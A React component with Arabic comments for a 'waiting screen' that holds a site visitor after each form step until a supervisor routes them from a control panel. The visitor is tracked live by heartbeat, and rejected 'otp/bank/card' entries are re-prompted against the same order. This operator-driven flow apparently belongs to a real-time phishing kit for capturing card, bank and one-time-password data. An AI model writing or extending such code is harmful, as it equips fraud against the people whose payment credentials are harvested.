/* شاشة انتظار مشتركة: تظهر بعد إدخال الزائر لأي خطوة، وتبقى حتى يوجّهه المشرف من لوحة التحكم.
   تستطلع توجيه (directive) الطلب الحالي من الخادم وتنتقل تلقائياً عند تغيّره من "wait" إلى مسار وجهة. */
import { useEffect } from "react";
import { useLocation } from "wouter";
import { pollCurrentOrderDirective, startHeartbeat, clearCurrentOrder } from "@/lib/liveOrders";
import { resolveOrderDirective } from "@/lib/orderDirective";

export default function WaitingScreen({ message }: { message?: string }) {
  const [, navigate] = useLocation();

  useEffect(() => {
    function routeTo(directive: string) {
      const resolved = resolveOrderDirective(directive);
      if (!resolved) return; // wait أو قيمة غير معروفة → ابقَ
      // عند النجاح فقط نمسح معرّف الطلب (انتهت الجلسة).
      // عند الرفض القابل لإعادة المحاولة (otp/bank/card) نُبقي نفس المعرّف
      // حتى تُحدّث إعادة الإرسال الطلب نفسه في لوحة التحكم بدل إنشاء طلب جديد.
      if (resolved.base === "success") {
        clearCurrentOrder();
      }
      navigate(resolved.path);
    }

    // نبضة حضور لإبقاء الزائر "متصل" في لوحة التحكم
    const stopBeat = startHeartbeat();
    // استطلاع دوري للتوجيه
    const stopPoll = pollCurrentOrderDirective((directive: string) => {
      if (directive && directive !== "wait") routeTo(directive);
    });

    return () => {
      stopBeat();
      stopPoll();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <div className="min-h-[70vh] flex items-center justify-center px-4">
      <div className="rounded-2xl bg-[#3a3a3a] px-10 py-9 shadow-xl flex flex-col items-center max-w-sm w-full">
        <div className="relative h-12 w-12 mb-5">
          <div className="absolute inset-0 rounded-full border-[3px] border-[#5a5a5a]" />
          <div className="absolute inset-0 rounded-full border-[3px] border-transparent border-t-[#C9A227] animate-spin" />
        </div>
        <p className="text-sm text-gray-200 text-center leading-relaxed">
          {message || "جارٍ التحقق من المعلومات، يرجى الانتظار"}
        </p>
      </div>
    </div>
  );
}
